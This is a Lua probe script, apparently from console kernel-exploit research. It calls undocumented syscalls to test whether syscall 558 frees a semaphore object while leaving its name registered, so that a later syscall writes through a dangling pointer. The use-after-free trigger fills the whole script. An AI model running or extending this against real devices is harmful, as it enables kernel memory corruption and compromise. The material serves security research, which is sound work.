-- CRASH_CLASS: MODERATE
-- PROBE 854a: does syscall 558 free an osem object and leave its name registered?
--
-- Context: 550 (destroy) takes the entry rwlock exclusive, unregisters the name,
-- drops the refcount and frees.  558 (13.60 offset 0xac73c0) looks up the same
-- table ([proc+0xc48]) with type = (arg2 & 0xffff) | 0x1000, removes the entry
-- and frees the object with no refcount check and no name unregister.  If that
-- decode holds on 14.10, 551(name) must still resolve the freed object and
-- 555(id, n) then writes through a dangling pointer.

print("=== PROBE 854a: SYS 558 ON AN OSEM OBJECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function call(f, ...)
    local ok, r = pcall(f, ...)
    if not ok then return "ERR" end
    return hx(r)
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc552 = make_syscall(552)
local sc555 = make_syscall(555)
local sc558 = make_syscall(558)

local nb = memory.alloc(0x60)
local function setname(s)
    for off = 0, 0x5F, 4 do
        pcall(function() memory.write_dword(nb + off, 0) end)
    end
    for i = 1, #s do
        pcall(function() memory.write_byte(nb + i - 1, s:byte(i)) end)
    end
end

local function create(name, a3, a4)
    setname(name)
    local r = sc549(uint64(nb), uint64(1), uint64(a3), uint64(a4))
    return to_num(r)
end

print(string.format("[0] pid=%d", to_num(syscall.getpid())))

-- control: create, poll the counter, find by name, destroy
local a = create("ctl1", 1, 0x100)
print(string.format("[A] create ctl1 id=%s  555(+1)=%s  551(name)=%s", hx(a), call(sc555, uint64(a), uint64(1)), call(sc551, uint64(nb))))
print(string.format("[A] 550(id)=%s  551(name after destroy)=%s", call(sc550, uint64(a)), call(sc551, uint64(nb))))

-- candidates: each type variant on a fresh object
local types = { 0x1120, 0x120, 0x1000, 0x10120, 0x12000 }
for i, t in ipairs(types) do
    local name = "v" .. i
    local id = create(name, 1, 0x100)
    if id < 0 then id = -(id) end
    local before = call(sc555, uint64(id), uint64(1))
    local r = call(sc558, uint64(id), uint64(t))
    local after_name = call(sc551, uint64(nb))
    local after_op = call(sc555, uint64(id), uint64(1))
    local after_destroy = call(sc550, uint64(id))
    print(string.format("[B%d] type=%s id=%s 555before=%s 558=%s 551after=%s 555after=%s 550after=%s",
        i, hx(t), hx(id), before, r, after_name, after_op, after_destroy))
end

-- health: can the table still serve create/destroy?
local h = create("h1", 1, 0x100)
print(string.format("[C] health create=%s 555(+1)=%s 550=%s", hx(h), call(sc555, uint64(h), uint64(1)), call(sc550, uint64(h))))
print("[D] alive=true")
